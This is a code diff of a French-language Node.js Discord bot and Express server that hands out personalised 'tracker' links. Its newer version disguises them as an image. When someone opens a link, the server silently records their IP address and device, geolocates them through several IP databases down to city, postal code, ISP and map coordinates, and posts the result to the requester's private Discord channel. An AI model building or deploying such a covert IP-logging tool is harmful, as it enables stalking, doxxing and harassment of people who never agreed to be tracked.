@@ -1,200 +1,234 @@
-require('dotenv').config();
-const { Client, GatewayIntentBits, Partials, ChannelType, PermissionsBitField, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
 const express = require('express');
+const cors = require('cors');
+const maxmind = require('maxmind');
 const axios = require('axios');
-const { v4: uuidv4 } = require('uuid');
-const app = express();
-const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
-    ],
-    partials: [Partials.Channel]
-});
+const fs = require('fs');
+const crypto = require('crypto');
+const DeviceDetector = require('device-detector-js');
+require('dotenv').config();
 
-const PORT = process.env.PORT || 3000;
-const TRACKER_DOMAIN = process.env.TRACKER_DOMAIN;
-const CHANNEL_GENERATE_LINK_ID = process.env.CHANNEL_GENERATE_LINK_ID;
-const CATEGORY_TRACKERS_ID = process.env.CATEGORY_TRACKERS_ID;
-const MAXMIND_API = process.env.MAXMIND_API;
+const {
+  Client,
+  GatewayIntentBits,
+  Partials,
+  Events,
+  ButtonBuilder,
+  ActionRowBuilder,
+  ButtonStyle,
+  ChannelType,
+  PermissionsBitField,
+  EmbedBuilder
+} = require('discord.js');
+
+const port = process.env.PORT || 3000;
+const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
+const BDC_TOKEN = process.env.BDC_TOKEN;
+const TRACKER_BASE_URL = "https://tracker-09q2.onrender.com/image.jpg?u=";
+const BUTTON_CHANNEL_NAME = "📎・génère-lien-tracker";
+const CLIENTS_FILE = './clients.json';
 
-let messageLinkButton;
+const app = express();
+app.use(cors());
+const deviceDetector = new DeviceDetector();
 
-client.once('ready', async () => {
-    console.log(`✅ Connecté en tant que ${client.user.tag}`);
+let lookup;
+(async () => {
+  lookup = await maxmind.open('./GeoLite2-City.mmdb');
+})();
 
-    const channel = await client.channels.fetch(CHANNEL_GENERATE_LINK_ID);
-    if (!channel) {
-        console.error('❌ Salon de génération de lien introuvable.');
-        return;
+function compareFields(label, ...values) {
+  const clean = values.filter(v => v && v !== 'undefined');
+  const unique = [...new Set(clean.map(v => v.toLowerCase?.() || v))];
+  const emoji = unique.length === 1 ? '✅' : '⚠️';
+  return `**${label} :** ${clean.join(' / ') || '❌ Introuvable'} ${emoji}`;
+}
+
+function getBestCoord(...coords) {
+  for (let c of coords) {
+    if (c && c.includes(',')) return c;
+  }
+  return null;
+}
+app.get('/image.jpg', async (req, res) => {
+  const queryId = req.query.u;
+  if (!queryId) return res.status(400).send("Lien invalide");
+
+  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const ip = rawIp.split(',')[0].trim();
+  const userAgent = req.headers['user-agent'];
+  const device = deviceDetector.parse(userAgent);
+
+  let geo = {}, ipinfo = {}, bigdata = {};
+
+  try {
+    geo = lookup.get(ip) || {};
+  } catch {}
+
+  try {
+    const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
+    ipinfo = data;
+  } catch {}
+
+  try {
+    const { data } = await axios.get(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${ip}&localityLanguage=fr&key=${BDC_TOKEN}`);
+    bigdata = data;
+  } catch {}
+
+  const coordsMaxMind = geo?.location ? `${geo.location.latitude},${geo.location.longitude}` : null;
+  const coordsBigData = bigdata?.location ? `${bigdata.location.latitude},${bigdata.location.longitude}` : null;
+  const coordsIpinfo = ipinfo?.loc || null;
+
+  const bestCoords = getBestCoord(coordsBigData, coordsIpinfo, coordsMaxMind);
+  const coordsField = bestCoords
+    ? `[${bestCoords}](https://maps.google.com/?q=${bestCoords})`
+    : '❌ Introuvable';
+
+  const embed = new EmbedBuilder()
+    .setTitle("📸 Image piégée ouverte !")
+    .setDescription(`**IP :** ${ip}\n**Appareil :** ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}`)
+    .setColor(0xff6600)
+    .addFields(
+      { name: "🌍 Localisation", value: [
+        compareFields("Pays", bigdata.country?.name, ipinfo.country, geo?.country?.names?.fr),
+        compareFields("Région", bigdata.principalSubdivision, ipinfo.region, geo?.subdivisions?.[0]?.names?.fr),
+        compareFields("Ville", bigdata.city?.name, ipinfo.city, geo?.city?.names?.fr),
+        compareFields("Code postal", bigdata.postcode, ipinfo.postal, geo?.postal?.code),
+        `**Coordonnées :** ${coordsField} ${coordsBigData && coordsIpinfo && coordsMaxMind ? '⚠️' : '✅'}`,
+        compareFields("FAI", ipinfo.org, geo?.traits?.isp)
+      ].join('\n') }
+    )
+    .setFooter({ text: "🔍 Tracker avancé", iconURL: "https://cdn-icons-png.flaticon.com/512/3524/3524393.png" })
+    .setTimestamp();
+  try {
+    if (fs.existsSync(CLIENTS_FILE)) {
+      const clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
+      const channelId = clients[queryId];
+
+      if (channelId) {
+        await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, {
+          embeds: [embed]
+        }, {
+          headers: {
+            Authorization: `Bot ${DISCORD_TOKEN}`,
+            'Content-Type': 'application/json'
+          }
+        });
+      }
+    }
+  } catch (err) {
+    console.log("❌ Erreur Discord log :", err.message);
+  }
+
+  res.status(204).send();
+});
+app.listen(port, () => {
+  console.log(`🛰️ Serveur Express actif sur le port ${port}`);
+});
+
+// DISCORD BOT
+const client = new Client({
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
+  partials: [Partials.Channel]
+});
+
+client.once(Events.ClientReady, async () => {
+  console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);
+
+  const guild = client.guilds.cache.first();
+  const channel = guild.channels.cache.find(c => c.name.includes("génère") && c.isTextBased());
+
+  if (!channel) return console.log("❌ Salon 'génère-lien-tracker' introuvable");
+
+  const messages = await channel.messages.fetch({ limit: 10 });
+  const oldMsg = messages.find(msg => msg.author.id === client.user.id && msg.content.includes("[TRACKER_BOUTON]"));
+
+  if (oldMsg) {
+    console.log("✅ Message bouton déjà présent.");
+    return;
+  }
+
+  const bouton = new ButtonBuilder()
+    .setCustomId("generate_tracker")
+    .setLabel("🔗 Générer mon lien")
+    .setStyle(ButtonStyle.Primary);
+
+  const row = new ActionRowBuilder().addComponents(bouton);
+
+  const message = await channel.send({
+    content: "[TRACKER_BOUTON] 🎯 Clique sur le bouton ci-dessous pour générer ton lien tracker personnalisé 👇",
+    components: [row]
+  });
+
+  await message.pin();
+  console.log("✅ Message bouton envoyé et épinglé !");
+});
+client.on(Events.InteractionCreate, async interaction => {
+  if (!interaction.isButton()) return;
+  if (interaction.customId !== "generate_tracker") return;
+
+  try {
+    await interaction.deferReply({ ephemeral: true });
+
+    const guild = interaction.guild;
+    const user = interaction.user;
+
+    const shortId = crypto.randomBytes(3).toString("hex");
+    const channelName = `🔗・mon-lien-tracker-${shortId}`;
+
+    const privateChannel = await guild.channels.create({
+      name: channelName,
+      type: ChannelType.GuildText,
+      permissionOverwrites: [
+        { id: guild.roles.everyone, deny: [PermissionsBitField.Flags.ViewChannel] },
+        { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory], deny: [
+          PermissionsBitField.Flags.SendMessages,
+          PermissionsBitField.Flags.AttachFiles,
+          PermissionsBitField.Flags.EmbedLinks,
+          PermissionsBitField.Flags.MentionEveryone,
+          PermissionsBitField.Flags.AddReactions
+        ] },
+        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.EmbedLinks, PermissionsBitField.Flags.AttachFiles, PermissionsBitField.Flags.ManageChannels] }
+      ]
+    });
+
+    const uniqueId = `${user.id}_${shortId}`;
+    const trackerUrl = `${TRACKER_BASE_URL}${uniqueId}`;
+
+    await privateChannel.send({
+      content: `🎯 Voici ton lien tracker unique :\n<${trackerUrl}>\n\n🕵️‍♂️ Les connexions détectées s'afficheront ici automatiquement.\n⏳ *Ce salon sera supprimé dans 15 minutes...*`
+    });
+
+    let clients = {};
+    if (fs.existsSync(CLIENTS_FILE)) {
+      clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
     }
 
-    const messages = await channel.messages.fetch({ limit: 10 });
-    const existingMessage = messages.find(m => m.author.id === client.user.id && m.components.length > 0);
+    clients[uniqueId] = privateChannel.id;
+    fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
 
-    if (!existingMessage) {
-        const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setCustomId('generate_link')
-                .setLabel('🎯 Générer mon lien')
-                .setStyle(ButtonStyle.Primary)
-        );
+    await interaction.editReply({
+      content: `✅ Ton lien a été généré ici : <#${privateChannel.id}>`,
+      ephemeral: true
+    });
 
-        const msg = await channel.send({
-            content: 'Clique sur le bouton pour générer ton lien tracker 👇',
-            components: [row]
-        });
-        await msg.pin();
-        messageLinkButton = msg;
+    setTimeout(async () => {
+      try {
+        await privateChannel.delete();
+        console.log(`🗑️ Salon supprimé automatiquement : ${privateChannel.name}`);
+      } catch (err) {
+        console.error("❌ Erreur suppression salon :", err.message);
+      }
+    }, 15 * 60 * 1000); // 15 minutes
+
+  } catch (err) {
+    console.error("❌ Erreur Interaction :", err);
+    if (interaction.replied || interaction.deferred) {
+      await interaction.editReply({ content: "❌ Une erreur est survenue." });
     } else {
-        messageLinkButton = existingMessage;
+      await interaction.reply({ content: "❌ Impossible de traiter la demande.", ephemeral: true });
     }
+  }
 });
 
-client.on('interactionCreate', async interaction => {
-    if (!interaction.isButton()) return;
-    if (interaction.customId === 'generate_link') {
-        const uniqueId = uuidv4().split('-')[0];
-
-        const channelName = `🔗・mon-lien-tracker-${uniqueId}`;
-        const existingChannel = interaction.guild.channels.cache.find(c => c.name === channelName);
-        if (existingChannel) {
-            await interaction.reply({ content: `Tu as déjà un salon ici : ${existingChannel}`, ephemeral: true });
-            return;
-        }
-
-        const trackerUrl = `${TRACKER_DOMAIN}/${uniqueId}`;
-
-        const newChannel = await interaction.guild.channels.create({
-            name: channelName,
-            type: ChannelType.GuildText,
-            parent: CATEGORY_TRACKERS_ID || null,
-            permissionOverwrites: [
-                {
-                    id: interaction.guild.id,
-                    deny: [PermissionsBitField.Flags.ViewChannel],
-                },
-                {
-                    id: interaction.user.id,
-                    allow: [
-                        PermissionsBitField.Flags.ViewChannel,
-                        PermissionsBitField.Flags.ReadMessageHistory
-                    ],
-                    deny: [
-                        PermissionsBitField.Flags.SendMessages,
-                        PermissionsBitField.Flags.AttachFiles,
-                        PermissionsBitField.Flags.EmbedLinks,
-                        PermissionsBitField.Flags.MentionEveryone,
-                        PermissionsBitField.Flags.AddReactions,
-                    ],
-                },
-                {
-                    id: client.user.id,
-                    allow: [
-                        PermissionsBitField.Flags.ViewChannel,
-                        PermissionsBitField.Flags.SendMessages,
-                        PermissionsBitField.Flags.EmbedLinks,
-                        PermissionsBitField.Flags.AttachFiles,
-                        PermissionsBitField.Flags.ManageChannels
-                    ],
-                },
-            ],
-        });
-        await newChannel.send({
-            embeds: [
-                new EmbedBuilder()
-                    .setTitle('🔗 Ton lien tracker est prêt !')
-                    .setDescription(`[Clique ici pour accéder à ton lien](${trackerUrl})\n\nToutes les connexions seront affichées ici.`)
-                    .setColor(0x00AE86)
-                    .setTimestamp()
-            ]
-        });
-
-        await interaction.reply({ content: `Ton salon privé a été créé : ${newChannel}`, ephemeral: true });
-
-        setTimeout(async () => {
-            if (newChannel.deletable) {
-                await newChannel.delete().catch(console.error);
-            }
-        }, 15 * 60 * 1000); // 15 minutes
-    }
-});
-
-app.get('/:id', async (req, res) => {
-    const id = req.params.id;
-    const channel = client.channels.cache.find(c => c.name.includes(id));
-
-    if (!channel) return res.redirect('https://google.com');
-
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-
-    let dataMaxmind = {};
-    let dataIpinfo = {};
-
-    try {
-        const resMaxmind = await axios.get(`https://geoip.maxmind.com/geoip/v2.1/city/${ip}`, {
-            headers: { Authorization: `Basic ${MAXMIND_API}` }
-        });
-        dataMaxmind = resMaxmind.data;
-    } catch (err) {
-        console.error('Erreur MaxMind:', err.message);
-    }
-
-    try {
-        const resIpinfo = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
-        dataIpinfo = resIpinfo.data;
-    } catch (err) {
-        console.error('Erreur IPInfo:', err.message);
-    }
-
-    function compareFields(field1, field2) {
-        if (!field1 && !field2) return 'Inconnu';
-        if (field1 && field2) {
-            if (field1.toLowerCase() === field2.toLowerCase()) return `✅ ${field1}`;
-            else return `⚠️ ${field1} / ${field2}`;
-        }
-        return `⚠️ ${field1 || field2}`;
-    }
-    const locMaxmind = dataMaxmind?.location;
-    const locIpinfo = dataIpinfo?.loc?.split(',');
-
-    let latitude = locIpinfo?.[0] || locMaxmind?.latitude;
-    let longitude = locIpinfo?.[1] || locMaxmind?.longitude;
-    let mapsUrl = (latitude && longitude) ? `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}` : 'Non disponible';
-
-    const embed = new EmbedBuilder()
-        .setTitle('📥 Nouvelle connexion détectée !')
-        .addFields(
-            { name: 'Adresse IP', value: `\`\`\`${ip}\`\`\``, inline: false },
-            { name: 'Pays', value: compareFields(dataIpinfo?.country, dataMaxmind?.country?.iso_code), inline: true },
-            { name: 'Région', value: compareFields(dataIpinfo?.region, dataMaxmind?.subdivisions?.[0]?.names?.en), inline: true },
-            { name: 'Ville', value: compareFields(dataIpinfo?.city, dataMaxmind?.city?.names?.en), inline: true },
-            { name: 'Code Postal', value: compareFields(dataIpinfo?.postal, dataMaxmind?.postal?.code), inline: true },
-            { name: 'FAI', value: compareFields(dataIpinfo?.org, dataMaxmind?.traits?.isp), inline: true },
-            { name: 'Coordonnées GPS', value: latitude && longitude ? `[Voir sur Google Maps](${mapsUrl})` : 'Inconnues', inline: false }
-        )
-        .setColor(0x3498db)
-        .setTimestamp();
-
-    channel.send({ embeds: [embed] });
-
-    res.send(`
-    <html>
-        <head>
-            <title>Chargement...</title>
-            <meta http-equiv="refresh" content="2;url=https://google.com" />
-        </head>
-        <body>
-            Redirection en cours...
-        </body>
-    </html>
-    `);
-});
-app.listen(PORT, () => {
-    console.log(`🌐 Serveur web actif sur le port ${PORT}`);
-});
-
-client.login(process.env.TOKEN);
+client.login(DISCORD_TOKEN);
